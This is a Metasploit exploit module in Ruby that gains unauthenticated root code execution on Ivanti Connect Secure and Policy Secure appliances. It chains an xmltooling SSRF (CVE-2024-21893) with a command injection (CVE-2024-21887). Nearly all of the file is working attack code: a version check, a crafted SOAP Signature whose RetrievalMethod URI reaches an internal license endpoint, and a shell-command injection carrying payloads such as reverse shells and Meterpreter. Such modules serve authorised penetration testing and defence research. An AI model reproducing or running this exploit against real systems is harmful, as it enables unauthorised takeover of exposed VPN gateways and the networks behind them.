##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Ivanti Connect Secure Unauthenticated Remote Code Execution',
        'Description' => %q{
          This module chains a server side request forgery (SSRF) vulnerability (CVE-2024-21893) and a command injection
          vulnerability (CVE-2024-21887) to exploit vulnerable instances of either Ivanti Connect Secure or Ivanti
          Policy Secure, to achieve unauthenticated remote code execution. All currently supported versions 9.x and
          22.x are vulnerable, prior to the vendor patch released on Feb 1, 2024. It is unknown if unsupported versions
          8.x and below are also vulnerable.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'sfewer-r7', # MSF Exploit & Rapid7 Analysis
        ],
        'References' => [
          ['CVE', '2024-21893'], # The SSRF as Ivanti reported it, but it is actually an existing vuln in the library xmltooling.
          ['CVE', '2023-36661'], # The original SSRF CVE id in xmltooling, as disclosed by Shibboleth.
          ['CVE', '2024-21887'], # The command injection vulnerability (Ivanti grouped several under one CVE).
          ['URL', 'https://attackerkb.com/topics/FGlK1TVnB2/cve-2024-21893/rapid7-analysis'], # Rapid7 Analysis of CVE-2024-21893
          ['URL', 'https://attackerkb.com/topics/AdUh6by52K/cve-2023-46805/rapid7-analysis'], # Rapid7 Analysis of CVE-2024-21887
          ['URL', 'https://forums.ivanti.com/s/article/CVE-2024-21888-Privilege-Escalation-for-Ivanti-Connect-Secure-and-Ivanti-Policy-Secure'],
          ['URL', 'https://shibboleth.net/community/advisories/secadv_20230612.txt']
        ],
        'DisclosureDate' => '2024-01-31',
        'Platform' => %w[linux unix],
        'Arch' => [ARCH_CMD],
        'Privileged' => true, # Code execution as root.
        'Targets' => [
          # Tested against Ivanti Connect Secure version 22.3R1 (build 1647) with the following payloads:
          # cmd/linux/http/x64/meterpreter/reverse_tcp
          # cmd/linux/http/x64/shell/reverse_tcp
          # cmd/linux/http/x86/shell/reverse_tcp
          # cmd/unix/python/meterpreter/reverse_tcp
          # cmd/unix/reverse_bash
          # cmd/unix/reverse_python
          ['Automatic', {}]
        ],
        'DefaultOptions' => {
          'RPORT' => 443,
          'SSL' => true,
          'FETCH_WRITABLE_DIR' => '/tmp'
        },
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )
  end

  def check
    # We get a static resource that contains an old banner circa 2018. The product "Connect Secure" was acquired by
    # Ivanti when Ivanti acquired "Pulse Secure", so we look for this string. This lets us confirm the target is running
    # the product "Connect Secure" (Tested against 22.3R1). We do not have an unauthenticated method to get a version
    # number, so this check routine can only return either Detected or Unknown.

    # This exploit chain based on CVE-2024-21893 bypasses a mitigation for an earlier exploit chain, based upon
    # CVE-2023-46805. Therefore, we dont leverage CVE-2023-46805 to access the /api/v1/system/system-information
    # endpoint for version information, as we assume the target has the first Ivanti mitigation applied. If the target
    # has not had the first mitigation applied, then the exploit ivanti_connect_secure_rce_cve_2023_46805 will work.

    res = send_request_cgi(
      'method' => 'GET',
      'uri' => '/dana-na/css/visibility.css'
    )

    return CheckCode::Unknown('Connection failed') unless res

    return CheckCode::Safe if res.code != 200

    if res.body.include? 'Pulse Secure'
      return CheckCode::Detected
    end

    Exploit::CheckCode::Unknown
  end

  def exploit
    # The SSRF URL we use targets a Python backend service bound to 127.0.0.1:8090. This backend service is vulnerable
    # to an unauthenticated command injection vulnerability (CVE-2024-21887).
    # Note: Ivanti grouped multiple command injection vulnerabilities into CVE-2024-21887. We choose one that can be
    # triggered via a single HTTP GET request, as this is what the SSRF gives us (i.e. The SSRF does not perform a POST
    # request).
    ssrf_url = "http://127.0.0.1:8090/api/v1/license/keys-status/#{Rex::Text.uri_encode(";#{payload.encoded} #")}"

    # CVE-2024-21893 is an SSRF in the xmltooling library when processing a Signature with a KeyInfo element. The
    # KeyInfo element can have a RetrievalMethod element with a URI attribute that points to a remote resource. The
    # xmltooling library will perform a HTTP GET request to this URI, giving us an SSRF exploit primitive.
    # While Ivanti reported this as CVE-2024-21893, it is actually CVE-2023-36661 and was patched by the upstream vendor
    # several months prior to being exploited in the wild in Ivanti Connect Secure.
    xml_data = %(<?xml version="1.0" encoding="UTF-8"?>
    <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
      <soap:Body>
        <ds:Signature
        xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
          <ds:SignedInfo>
            <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
            <ds:SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-sha1"/>
          </ds:SignedInfo>
          <ds:SignatureValue>#{Rex::Text.rand_text_hex(20)}</ds:SignatureValue>
          <ds:KeyInfo xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.w3.org/2000/09/xmldsig" xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
            <ds:RetrievalMethod URI="#{ssrf_url}"/>
            <ds:X509Data/>
          </ds:KeyInfo>
          <ds:Object></ds:Object>
        </ds:Signature>
      </soap:Body>
    </soap:Envelope>)

    send_request_cgi(
      'method' => 'POST',
      'uri' => '/dana-ws/saml20.ws',
      'ctype' => 'text/xml',
      'data' => xml_data
    )
  end
end
